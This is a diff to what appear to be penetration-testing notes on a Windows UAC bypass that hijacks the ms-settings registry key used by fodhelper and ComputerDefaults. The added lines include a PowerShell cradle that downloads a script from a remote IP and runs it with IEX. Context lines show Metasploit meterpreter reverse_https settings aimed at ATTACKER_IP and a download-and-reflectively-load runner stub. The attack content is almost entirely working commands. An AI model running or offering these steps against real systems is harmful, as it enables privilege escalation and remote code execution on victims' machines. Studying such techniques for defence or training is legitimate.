@@ -27,13 +27,22 @@ If we create the registry key and add the _DelegateExecute_ value, Fodhelper w
 
 ```powershell
 # Creates the registry path + sets the value of the default key to "powershell.exe"
-PS C:\> New-Item -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Value powershell.exe –Force
+PS C:\> New-Item -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Value "powershell.exe" –Force
 
 # Create DelegateExecute value
 PS C:\> New-ItemProperty -Path HKCU:\Software\Classes\ms-settings\shell\open\command -Name DelegateExecute -PropertyType String -Force
 
 # start fodhelper.exe
 PS C:\> C:\Windows\System32\fodhelper.exe
+```
+
+Alternative:
+```powershell
+PS C:\> Set-ItemProperty "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "(default)" -Value "powershell.exe (New-Object System.Net.WebClient).DownloadString('http://192.168.45.203/run.txt') | IEX" -Force
+
+PS C:\> Set-ItemProperty "HKCU:\Software\Classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value "" -Force
+
+PS C:\> Start-Process "C:\Windows\System32\ComputerDefaults.exe"
 ```
 
 **Automatic Exploit**
@@ -46,7 +55,7 @@ msf> set target 1 # x64; 0 for x86
 msf> set session SESSION_ID
 msf> set payload windows/x64/meterpreter/reverse_https
 msf> set lhost ATTACKER_IP
-msf> set lport 444
+msf> set lport 443
 msf> exploit
 ```
 
@@ -126,7 +135,7 @@ msf> set target 1 # x64; 0 for x86
 msf> set session SESSION_ID
 msf> set payload windows/x64/meterpreter/reverse_https
 msf> set lhost ATTACKER_IP
-msf> set lport 444
+msf> set lport 443
 msf> set EnableStageEncoding true
 msf> set StageEncoder x64/zutto_dekiru # or x64/xor_dynamic in case of fail
 msf> exploit
@@ -155,7 +164,7 @@ $bytes=(New-Object System.Net.WebClient).DownloadData('http://ATTACKER_IP/runner
 [Reflection.Assembly]::Load($bytes).EntryPoint.Invoke($null,$null)
 ```
 
-The C# runner DLL (Visual Studio Class Library project):
+The C# runner DLL (Visual Studio Class Library project, .NET Framework):
 ```csharp
 using System;
 using System.Runtime.InteropServices;
